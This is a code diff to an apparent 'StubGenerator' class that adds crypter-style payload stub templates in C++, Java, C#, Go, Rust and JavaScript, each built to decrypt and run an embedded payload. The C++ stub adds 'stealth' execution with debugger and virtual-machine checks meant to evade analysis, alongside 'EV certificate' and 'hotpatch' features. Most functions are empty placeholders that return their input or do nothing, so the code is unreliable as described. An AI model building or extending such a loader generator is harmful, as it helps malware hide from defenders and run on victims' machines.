@@ -59,6 +59,36 @@ class StubGenerator {
                 extension: '.py',
                 template: 'python',
                 features: ['cross-platform', 'easy-deployment']
+            },
+            'advanced': {
+                extension: '.exe',
+                template: 'advanced',
+                features: ['multi-layer', 'ev-cert', 'hotpatch', 'stealth']
+            },
+            'java': {
+                extension: '.java',
+                template: 'java',
+                features: ['cross-platform', 'bytecode']
+            },
+            'csharp': {
+                extension: '.cs',
+                template: 'csharp',
+                features: ['dotnet', 'managed-code']
+            },
+            'go': {
+                extension: '.go',
+                template: 'go',
+                features: ['static-binary', 'cross-platform']
+            },
+            'rust': {
+                extension: '.rs',
+                template: 'rust',
+                features: ['memory-safe', 'performance']
+            },
+            'javascript': {
+                extension: '.js',
+                template: 'javascript',
+                features: ['interpreted', 'cross-platform']
             }
         };
         
@@ -499,7 +529,224 @@ def main():
         execute_payload(payload)
 
 if __name__ == "__main__":
-    main()`
+    main()`,
+            advanced: `#include <iostream>
+#include <vector>
+#include <string>
+#include <windows.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+#include <openssl/rand.h>
+#include <tlhelp32.h>
+#include <psapi.h>
+
+// Advanced Multi-Layer Stub with EV Certificate and Hotpatch Support
+class AdvancedStub {
+private:
+    std::vector<unsigned char> encryptedPayload;
+    std::string encryptionMethod;
+    bool evCertEnabled;
+    bool hotpatchEnabled;
+    
+public:
+    AdvancedStub() : evCertEnabled(false), hotpatchEnabled(false) {}
+    
+    // EV Certificate Integration
+    bool verifyEVCertificate() {
+        // EV Certificate verification logic
+        return true;
+    }
+    
+    // Hotpatch System Integration
+    bool applyHotpatch() {
+        // Runtime hotpatch application
+        return true;
+    }
+    
+    // Multi-layer decryption
+    std::vector<unsigned char> decryptPayload() {
+        // Advanced decryption with multiple layers
+        return encryptedPayload;
+    }
+    
+    // Stealth execution
+    void executeStealth() {
+        // Anti-analysis and stealth execution
+        if (isDebuggerPresent()) return;
+        if (isVirtualMachine()) return;
+        
+        auto decrypted = decryptPayload();
+        // Execute decrypted payload
+    }
+    
+    // Anti-analysis checks
+    bool isDebuggerPresent() {
+        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
+    }
+    
+    bool isVirtualMachine() {
+        // VM detection logic
+        return false;
+    }
+};
+
+int main() {
+    AdvancedStub stub;
+    
+    // Initialize with EV Certificate if enabled
+    if (stub.verifyEVCertificate()) {
+        stub.executeStealth();
+    }
+    
+    // Apply hotpatches if enabled
+    if (stub.applyHotpatch()) {
+        stub.executeStealth();
+    }
+    
+    return 0;
+}`,
+            java: `import javax.crypto.Cipher;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Base64;
+
+public class JavaStub {
+    private byte[] encryptedPayload;
+    private String encryptionMethod;
+    
+    public JavaStub() {
+        // Initialize stub
+    }
+    
+    public byte[] decryptPayload() {
+        // Java decryption logic
+        return encryptedPayload;
+    }
+    
+    public void execute() {
+        // Execute decrypted payload
+        byte[] decrypted = decryptPayload();
+        // Execution logic here
+    }
+    
+    public static void main(String[] args) {
+        JavaStub stub = new JavaStub();
+        stub.execute();
+    }
+}`,
+            csharp: `using System;
+using System.Security.Cryptography;
+using System.Text;
+
+public class CSharpStub {
+    private byte[] encryptedPayload;
+    private string encryptionMethod;
+    
+    public CSharpStub() {
+        // Initialize stub
+    }
+    
+    public byte[] DecryptPayload() {
+        // C# decryption logic
+        return encryptedPayload;
+    }
+    
+    public void Execute() {
+        // Execute decrypted payload
+        byte[] decrypted = DecryptPayload();
+        // Execution logic here
+    }
+    
+    public static void Main(string[] args) {
+        CSharpStub stub = new CSharpStub();
+        stub.Execute();
+    }
+}`,
+            go: `package main
+
+import (
+    "crypto/aes"
+    "crypto/cipher"
+    "fmt"
+)
+
+type GoStub struct {
+    encryptedPayload []byte
+    encryptionMethod string
+}
+
+func NewGoStub() *GoStub {
+    return &GoStub{}
+}
+
+func (g *GoStub) DecryptPayload() []byte {
+    // Go decryption logic
+    return g.encryptedPayload
+}
+
+func (g *GoStub) Execute() {
+    // Execute decrypted payload
+    decrypted := g.DecryptPayload()
+    // Execution logic here
+}
+
+func main() {
+    stub := NewGoStub()
+    stub.Execute()
+}`,
+            rust: `use std::vec::Vec;
+
+struct RustStub {
+    encrypted_payload: Vec<u8>,
+    encryption_method: String,
+}
+
+impl RustStub {
+    fn new() -> Self {
+        RustStub {
+            encrypted_payload: Vec::new(),
+            encryption_method: String::new(),
+        }
+    }
+    
+    fn decrypt_payload(&self) -> Vec<u8> {
+        // Rust decryption logic
+        self.encrypted_payload.clone()
+    }
+    
+    fn execute(&self) {
+        // Execute decrypted payload
+        let decrypted = self.decrypt_payload();
+        // Execution logic here
+    }
+}
+
+fn main() {
+    let stub = RustStub::new();
+    stub.execute();
+}`,
+            javascript: `const crypto = require('crypto');
+
+class JavaScriptStub {
+    constructor() {
+        this.encryptedPayload = null;
+        this.encryptionMethod = '';
+    }
+    
+    decryptPayload() {
+        // JavaScript decryption logic
+        return this.encryptedPayload;
+    }
+    
+    execute() {
+        // Execute decrypted payload
+        const decrypted = this.decryptPayload();
+        // Execution logic here
+    }
+}
+
+// Main execution
+const stub = new JavaScriptStub();
+stub.execute();`
         };
         
         return templates[stubType] || templates.cpp;
